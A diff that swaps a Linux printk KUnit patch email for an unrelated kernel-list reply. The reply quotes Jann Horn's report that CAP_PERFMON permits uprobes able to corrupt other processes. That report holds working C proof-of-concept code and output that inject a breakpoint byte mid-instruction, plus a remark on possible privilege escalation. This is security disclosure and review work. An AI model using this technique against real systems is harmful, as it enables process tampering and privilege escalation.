@@ -1,214 +1,209 @@
-Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A8297246797
-	for <linux-hardening@vger.kernel.org>; Wed,  2 Jul 2025 09:52:54 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=195.135.223.131
+Received: from foss.arm.com (foss.arm.com [217.140.110.172])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5E72123956E;
+	Wed,  2 Jul 2025 11:13:24 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.140.110.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751449976; cv=none; b=qZE3VBEwK7dYGxuZr5X0rfjmA7rxzbi9GxdYR+LRLRBKt8D5amATJaZnfQhpWED4xmvoPsvJe+Og6QOfXpbE/I/VTe499qQmqfSE0BplJXeCiWt8f5UPQubHXfHf1HXGjxh8JTJlpqspeocmMvOuYL6UvuTGltKkh0fJL8e0moM=
+	t=1751454806; cv=none; b=M65k/MUrHDWp/fud7jB0wRiyZ5dc8qbYFmDVUN9oa8551pXv9HGgqmSSayeqcu2CyG1Aknu9cxMYrCVwMd4w44FFtSeHww+93W2vPVqEVm0/gUqkg4KIIcJNeTsZDJYGqLmhFxH0CpCOE6GSQscSXavLQS+rJVX9ZmsaEesRSf0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751449976; c=relaxed/simple;
-	bh=6pWPj9yJPA1F97NyK/mMakcPyrDtppLr0XwrcICNR0g=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=b/Xb3Zc4kaEQXSqhJRkGuZ4znDBOvA3uy8tDE5xWsKheTGbIDMP1TaM1E9bvC+IdAYK1zBMr4kDQX4KwzeG+TBXL/LU1B8q9cRunAb5vb+1uzLx+MduCIVFNfgMA56XB7kXK4AT8ZwL39wuKRJ63Uiv80uxnSa/UlW1pK4V5nBs=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=suse.com; spf=pass smtp.mailfrom=suse.com; dkim=pass (1024-bit key) header.d=suse.com header.i=@suse.com header.b=nxQnPSzC; dkim=pass (1024-bit key) header.d=suse.com header.i=@suse.com header.b=B17rtKYb; arc=none smtp.client-ip=195.135.223.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=suse.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=suse.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=suse.com header.i=@suse.com header.b="nxQnPSzC";
-	dkim=pass (1024-bit key) header.d=suse.com header.i=@suse.com header.b="B17rtKYb"
-Received: from pathway.suse.cz (unknown [10.100.208.146])
-	by smtp-out2.suse.de (Postfix) with ESMTP id 9A7AE1F454;
-	Wed,  2 Jul 2025 09:52:52 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
-	t=1751449973; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=cGCtkuQDf7npqLhgpdL8AUxIksP8IpG+SBwNiySulak=;
-	b=nxQnPSzCutIWWBuqIvM+lU33+l9SWhyEVKr3ykznNrZ6T7hOXneR7f3WuYca5DNxlnsdd1
-	24o4yX+2dcIXqS1wo/8XuDpDAyKrSdY2YcdPFz3OQQ45mBDWsaZdJxSJCbFAo80AsRi2Wo
-	V9xhd6otm3b9L+7awkwXgAAGRT72OC8=
-Authentication-Results: smtp-out2.suse.de;
-	none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
-	t=1751449972; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=cGCtkuQDf7npqLhgpdL8AUxIksP8IpG+SBwNiySulak=;
-	b=B17rtKYbBzAkxUVY7QhgThXZpVzb8+vgr5zYWWxQW6z9BTKWjQ3c13mCY5PhUZXBuvgf02
-	7wnfNUCyXvnfOHYkwBd57CcGA8YV+RAbn67+zFDJuK0YlGYbE0vWSH4lOWhNMDUy/3EuSq
-	xdXADjzeYqtXEIQR0+DrMpgfFZNc1HA=
-From: Petr Mladek <pmladek@suse.com>
-To: =?UTF-8?q?Thomas=20Wei=C3=9Fschuh?= <thomas.weissschuh@linutronix.de>,
-	John Ogness <john.ogness@linutronix.de>,
-	Dan Carpenter <dan.carpenter@linaro.org>
-Cc: Steven Rostedt <rostedt@goodmis.org>,
-	Sergey Senozhatsky <senozhatsky@chromium.org>,
-	Kees Cook <kees@kernel.org>,
-	"Gustavo A . R . Silva" <gustavoars@kernel.org>,
-	David Gow <davidgow@google.com>,
-	Arnd Bergmann <arnd@kernel.org>,
-	Arnd Bergmann <arnd@arndb.de>,
-	linux-kernel@vger.kernel.org,
+	s=arc-20240116; t=1751454806; c=relaxed/simple;
+	bh=O4m4hWzSFeOYN9mZ0ZgX38tbQ6F3yuF4mDW0ZT8cyHc=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=l1XWStTBuDdiJEYt+mOO31EkBQgi7F7GInmEgOa56Dx1hS1bp1MREI4P4ZP/ydz9NJzgt6RUrq+zP4ykyNTKh89Fb82x+FJgx3fSF3g2rzncmw8N58MXhGE50YoeJYdMRyyeeY2f96j8RPL55n7tkqCcpXA3b0GNfI/T2RF2bSg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com; spf=pass smtp.mailfrom=arm.com; arc=none smtp.client-ip=217.140.110.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=arm.com
+Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
+	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 9351B22D9;
+	Wed,  2 Jul 2025 04:13:08 -0700 (PDT)
+Received: from J2N7QTR9R3 (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
+	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPSA id 17FBE3F6A8;
+	Wed,  2 Jul 2025 04:13:19 -0700 (PDT)
+Date: Wed, 2 Jul 2025 12:13:17 +0100
+From: Mark Rutland <mark.rutland@arm.com>
+To: Jann Horn <jannh@google.com>
+Cc: Serge Hallyn <serge@hallyn.com>,
+	linux-security-module <linux-security-module@vger.kernel.org>,
+	Peter Zijlstra <peterz@infradead.org>,
+	Ingo Molnar <mingo@redhat.com>,
+	Arnaldo Carvalho de Melo <acme@kernel.org>,
+	Namhyung Kim <namhyung@kernel.org>,
+	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
+	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
+	Adrian Hunter <adrian.hunter@intel.com>,
+	"Liang, Kan" <kan.liang@linux.intel.com>,
+	linux-perf-users@vger.kernel.org,
+	Kernel Hardening <kernel-hardening@lists.openwall.com>,
 	linux-hardening@vger.kernel.org,
-	Petr Mladek <pmladek@suse.com>
-Subject: [PATCH 3/3] printk: kunit: Fix __counted_by() in struct prbtest_rbdata
-Date: Wed,  2 Jul 2025 11:51:57 +0200
-Message-ID: <20250702095157.110916-4-pmladek@suse.com>
-X-Mailer: git-send-email 2.50.0
-In-Reply-To: <20250702095157.110916-1-pmladek@suse.com>
-References: <20250702095157.110916-1-pmladek@suse.com>
+	kernel list <linux-kernel@vger.kernel.org>,
+	Alexey Budankov <alexey.budankov@linux.intel.com>,
+	James Morris <jamorris@linux.microsoft.com>
+Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
+Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
+References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-hardening@vger.kernel.org
 List-Id: <linux-hardening.vger.kernel.org>
 List-Subscribe: <mailto:linux-hardening+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-hardening+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-X-Spamd-Result: default: False [-7.30 / 50.00];
-	REPLY(-4.00)[];
-	BAYES_HAM(-3.00)[100.00%];
-	MID_CONTAINS_FROM(1.00)[];
-	NEURAL_HAM_LONG(-1.00)[-1.000];
-	NEURAL_HAM_SHORT(-0.20)[-0.999];
-	MIME_GOOD(-0.10)[text/plain];
-	FROM_HAS_DN(0.00)[];
-	MIME_TRACE(0.00)[0:+];
-	RCPT_COUNT_TWELVE(0.00)[13];
-	TO_DN_SOME(0.00)[];
-	ARC_NA(0.00)[];
-	DKIM_SIGNED(0.00)[suse.com:s=susede1];
-	R_RATELIMIT(0.00)[to_ip_from(RLpam4jm9phgcop7d53x6uygpb)];
-	FROM_EQ_ENVFROM(0.00)[];
-	RCVD_COUNT_ZERO(0.00)[0];
-	TO_MATCH_ENVRCPT_ALL(0.00)[];
-	FUZZY_BLOCKED(0.00)[rspamd.com];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email,suse.com:mid,linaro.org:email,pathway.suse.cz:helo]
-X-Spam-Level: 
-X-Spam-Flag: NO
-X-Spam-Score: -7.30
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 
-__counted_by() has to point to a variable which defines the size
-of the related array. The code must never access the array
-beyond this limit.
+On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
+> Since commit c9e0924e5c2b ("perf/core: open access to probes for
+> CAP_PERFMON privileged process"), it is possible to create uprobes
+> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
+> have destructive effects, while my understanding is that CAP_PERFMON
+> is supposed to only let you _read_ stuff (like registers and stack
+> memory) from other processes, but not modify their execution.
 
-struct prbtest_rbdata currently stores the length of the string.
-And the code access the array beyond the limit when writing
-or reading the trailing '\0'.
+I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
+meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
+leave that discussion to others. I agree it seems undesirable to permit
+destructive effects.
 
-Store the size of the string, including the trailing '\0' if
-we wanted to keep __counted_by().
+> uprobes (at least on x86) can be destructive because they have no
+> protection against poking in the middle of an instruction; basically
+> as long as the kernel manages to decode the instruction bytes at the
+> caller-specified offset as a relocatable instruction, a breakpoint
+> instruction can be installed at that offset.
 
-Consistently use "_size" suffix when the trailing '\0' is counted.
-Note that MAX_RBDATA_TEXT_SIZE was originally used to limit
-the text length.
+FWIW, similar issues would apply to other architectures (even those like
+arm64 where instuctions are fixed-size and naturally aligned), as a
+uprobe could be placed on a literal pool in a text section, corrupting
+data.
 
-When touching the code, make sure that @text_size produced by
-get_random_u32_inclusive() stays within the limits.
+It looks like c9e0924e5c2b reverts cleanly, so that's an option.
 
-Reported-by: Dan Carpenter <dan.carpenter@linaro.org>
-Closes: https://lore.kernel.org/r/eaea66b9-266a-46e7-980d-33f40ad4b215@sabinyo.mountain
-Suggested-by: Thomas Weißschuh <thomas.weissschuh@linutronix.de>
-Signed-off-by: Petr Mladek <pmladek@suse.com>
----
- kernel/printk/printk_ringbuffer_kunit_test.c | 47 +++++++++++---------
- 1 file changed, 27 insertions(+), 20 deletions(-)
+Mark.
 
-diff --git a/kernel/printk/printk_ringbuffer_kunit_test.c b/kernel/printk/printk_ringbuffer_kunit_test.c
-index 0c3030fde8c2..088fe4d8c9b6 100644
---- a/kernel/printk/printk_ringbuffer_kunit_test.c
-+++ b/kernel/printk/printk_ringbuffer_kunit_test.c
-@@ -52,13 +52,12 @@ module_param(runtime_ms, ulong, 0400);
- 
- /* test data structure */
- struct prbtest_rbdata {
--	unsigned int len;
--	char text[] __counted_by(len);
-+	unsigned int size;
-+	char text[] __counted_by(size);
- };
- 
--#define MAX_RBDATA_TEXT_SIZE 0x7f
--/* +1 for terminator. */
--#define MAX_PRB_RECORD_SIZE (sizeof(struct prbtest_rbdata) + MAX_RBDATA_TEXT_SIZE + 1)
-+#define MAX_RBDATA_TEXT_SIZE 0x80
-+#define MAX_PRB_RECORD_SIZE (sizeof(struct prbtest_rbdata) + MAX_RBDATA_TEXT_SIZE)
- 
- struct prbtest_data {
- 	struct kunit *test;
-@@ -74,25 +73,29 @@ struct prbtest_thread_data {
- 
- static void prbtest_fail_record(struct kunit *test, const struct prbtest_rbdata *dat, u64 seq)
- {
--	KUNIT_FAIL(test, "BAD RECORD: seq=%llu len=%u text=%.*s\n",
--		   seq, dat->len,
--		   dat->len <= MAX_RBDATA_TEXT_SIZE ? dat->len : -1,
--		   dat->len <= MAX_RBDATA_TEXT_SIZE ? dat->text : "<invalid>");
-+	unsigned int len;
-+
-+	len = dat->size - 1;
-+
-+	KUNIT_FAIL(test, "BAD RECORD: seq=%llu size=%u text=%.*s\n",
-+		   seq, dat->size,
-+		   len < MAX_RBDATA_TEXT_SIZE ? len : -1,
-+		   len < MAX_RBDATA_TEXT_SIZE ? dat->text : "<invalid>");
- }
- 
- static bool prbtest_check_data(const struct prbtest_rbdata *dat)
- {
- 	unsigned int len;
- 
--	/* Sane length? */
--	if (dat->len < 1 || dat->len > MAX_RBDATA_TEXT_SIZE)
-+	/* Sane size? At least one character + trailing '\0' */
-+	if (dat->size < 2 || dat->size > MAX_RBDATA_TEXT_SIZE)
- 		return false;
- 
--	if (dat->text[dat->len] != '\0')
-+	len = dat->size - 1;
-+	if (dat->text[len] != '\0')
- 		return false;
- 
- 	/* String repeats with the same character? */
--	len = dat->len;
- 	while (len--) {
- 		if (dat->text[len] != dat->text[0])
- 			return false;
-@@ -114,10 +117,14 @@ static int prbtest_writer(void *data)
- 	kunit_info(tr->test_data->test, "start thread %03lu (writer)\n", tr->num);
- 
- 	for (;;) {
--		/* ensure at least 1 character */
--		text_size = get_random_u32_inclusive(1, MAX_RBDATA_TEXT_SIZE);
--		/* +1 for terminator. */
--		record_size = sizeof(struct prbtest_rbdata) + text_size + 1;
-+		/* ensure at least 1 character + trailing '\0' */
-+		text_size = get_random_u32_inclusive(2, MAX_RBDATA_TEXT_SIZE);
-+		if (WARN_ON_ONCE(text_size < 2))
-+			text_size = 2;
-+		if (WARN_ON_ONCE(text_size > MAX_RBDATA_TEXT_SIZE))
-+			text_size = MAX_RBDATA_TEXT_SIZE;
-+
-+		record_size = sizeof(struct prbtest_rbdata) + text_size;
- 		WARN_ON_ONCE(record_size > MAX_PRB_RECORD_SIZE);
- 
- 		/* specify the text sizes for reservation */
-@@ -140,9 +147,9 @@ static int prbtest_writer(void *data)
- 			r.info->text_len = record_size;
- 
- 			dat = (struct prbtest_rbdata *)r.text_buf;
--			dat->len = text_size;
--			memset(dat->text, text_id, text_size);
--			dat->text[text_size] = 0;
-+			dat->size = text_size;
-+			memset(dat->text, text_id, text_size - 1);
-+			dat->text[text_size - 1] = '\0';
- 
- 			prb_commit(&e);
- 
--- 
-2.50.0
-
+> This means uprobes can be used to alter what happens in another
+> process. It would probably be a good idea to go back to requiring
+> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
+> where the kernel can prove that the software breakpoint poke cannot
+> break the target process. (Which seems harder than doing it for
+> kprobe, since kprobe can at least rely on symbols to figure out where
+> a function starts...)
+> 
+> As a small example, in one terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
+> #include <unistd.h>
+> #include <stdio.h>
+> 
+> __attribute__((noinline))
+> void bar(unsigned long value) {
+>   printf("bar(0x%lx)\n", value);
+> }
+> 
+> __attribute__((noinline))
+> void foo(unsigned long value) {
+>   value += 0x90909090;
+>   bar(value);
+> }
+> 
+> void (*foo_ptr)(unsigned long value) = foo;
+> 
+> int main(void) {
+>   while (1) {
+>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
+> *)(void*)foo)[1]);
+>     foo_ptr(0);
+>     sleep(1);
+>   }
+> }
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
+> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
+> [...]
+> 00000000000011b0 <foo>:
+>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
+>     11b5:       48 01 c7                add    %rax,%rdi
+>     11b8:       eb d6                   jmp    1190 <bar>
+> [...]
+> jannh@horn:~/test/perfmon-uprobepoke$ ./target
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> ```
+> 
+> and in another terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <unistd.h>
+> #include <err.h>
+> #include <sys/mman.h>
+> #include <sys/syscall.h>
+> #include <linux/perf_event.h>
+> 
+> int main(void) {
+>   int uprobe_type;
+>   FILE *uprobe_type_file =
+> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
+>   if (uprobe_type_file == NULL)
+>     err(1, "fopen uprobe type");
+>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
+>     errx(1, "read uprobe type");
+>   fclose(uprobe_type_file);
+>   printf("uprobe type is %d\n", uprobe_type);
+> 
+>   unsigned long target_off;
+>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
+>   if (!pof)
+>     err(1, "popen nm");
+>   if (fscanf(pof, "%lx", &target_off) != 1)
+>     errx(1, "read target offset");
+>   pclose(pof);
+>   target_off += 1;
+>   printf("will poke at 0x%lx\n", target_off);
+> 
+>   struct perf_event_attr attr = {
+>     .type = uprobe_type,
+>     .size = sizeof(struct perf_event_attr),
+>     .sample_period = 100000,
+>     .sample_type = PERF_SAMPLE_IP,
+>     .uprobe_path = (unsigned long)"target",
+>     .probe_offset = target_off
+>   };
+>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
+>   if (perf_fd == -1)
+>     err(1, "perf_event_open");
+>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
+>   if (map == MAP_FAILED)
+>     err(1, "mmap error");
+>   printf("mmap success\n");
+>   while (1) pause();
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
+> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
+> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
+> uprobe type is 9
+> will poke at 0x11b1
+> mmap success
+> ```
+> 
+> This results in the first terminal changing output as follows, showing
+> that 0xcc was written into the middle of the "mov" instruction,
+> modifying its immediate operand:
+> ```
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> ```
+> 
+> It's probably possible to turn this into a privilege escalation by
+> doing things like clobbering part of the distance of a jump or call
+> instruction.
